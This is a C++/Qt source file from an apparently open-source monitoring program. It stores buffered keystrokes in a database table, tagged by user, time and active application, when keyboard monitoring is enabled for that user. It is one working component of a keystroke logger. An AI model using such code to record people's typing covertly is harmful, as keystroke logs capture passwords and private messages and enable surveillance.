/*
* Copyright (C) 2014 - Center of Excellence in Information Assurance
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
#include <QtSql>
#include <QFile>
#include <QTimer>
#include <QDateTime>
#include <QVariant>
#include <QDebug>

#include "consumer.h"
#include "globaldata.h"
#include "../Global/global.h"

Consumer::Consumer(QObject *parent):
        QObject(parent)
{
    m_timer = new QTimer(this);
    m_timer->setInterval(100);
    connect(m_timer,SIGNAL(timeout()),this,SLOT(consume()));
    m_timer->start();
}

void Consumer::consume()
{
    int userId = getCurrentUserId();

    qDebug() << "consume";

    // Check if Keyboard monitor is enabled for this user.
    if (!isEnabledForUser(userId)) {
        qDebug() << "Keyboard is disabled for this account.";
        return ;
    }

    if (!keyLogBuffer.length())
        return ;

    QSqlQuery query(QSqlDatabase::database());
    bool ok;


    qDebug() << "current char: " << keyLogBuffer;
    qDebug() << "current user: " << userId;


    if ( _addRecord ) {
        // new record
        query.prepare("INSERT INTO KeylogsTable (userId,currentDateTime,programName,log) VALUES (?,?,?,?);");
        query.addBindValue(userId);
        query.addBindValue(QDateTime::currentDateTime());
        query.addBindValue(_appName);
        query.addBindValue(keyLogBuffer);
        ok = query.exec();
        if (ok)
            _addRecord = false;

    } else {
        query.prepare("SELECT MAX(currentDateTime),no from KeylogsTable WHERE programName = ? AND userId = ?");
        query.addBindValue(_appName);
        query.addBindValue(userId);
        query.exec();
        query.next();
        int no = query.value(1).toInt();

        query.prepare("SELECT log from KeylogsTable WHERE no = ?");
        query.addBindValue(no);
        query.exec();
        query.next();
        QString log = query.value(0).toString();
        log += keyLogBuffer;

        query.prepare("UPDATE KeylogsTable SET log = ? WHERE no = ?");
        query.addBindValue(log);
        query.addBindValue(no);
        query.exec();
    }

    keyLogBuffer.clear();
}

int Consumer::getCurrentUserId() {
    int userId;
    QFile file(USER_ID_FILE_PATH);
    file.open(QIODevice::ReadOnly);
    QTextStream stream(&file);
    stream >> userId;
    file.close();
    return userId;
}

bool Consumer::isEnabledForUser(int id) {
    QSqlQuery query(QSqlDatabase::database());
    query.prepare("SELECT monitorKeyboard from SettingsTable WHERE userId = ?");
    query.addBindValue(id);
    query.exec();
    query.next();
    return (query.value(0).toInt()?true:false);
}
